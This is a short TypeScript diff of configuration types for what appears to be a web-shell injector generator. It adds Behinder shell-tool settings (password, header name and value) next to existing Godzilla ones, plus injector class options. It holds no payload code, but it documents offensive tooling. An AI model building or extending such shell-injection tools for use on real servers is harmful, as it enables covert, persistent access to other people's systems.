@@ -33,8 +33,16 @@ export interface GodzillaShellToolConfig {
   headerValue?: string;
 }
 
+export interface BehinderShellToolConfig {
+  shellClassName?: string;
+  pass?: string;
+  headerName?: string;
+  headerValue?: string;
+}
+
 export interface InjectorConfig {
   className?: string;
+  classInheritance?: string;
   urlPattern?: string;
 }
 
@@ -71,6 +79,6 @@ export interface GenerateResult {
   injectorSize: number;
   injectorBytesBase64Str: string;
   shellConfig: ShellConfig;
-  shellToolConfig: CommandShellToolConfig | GodzillaShellToolConfig;
+  shellToolConfig: CommandShellToolConfig | GodzillaShellToolConfig | BehinderShellToolConfig;
   injectorConfig: InjectorConfig;
 }
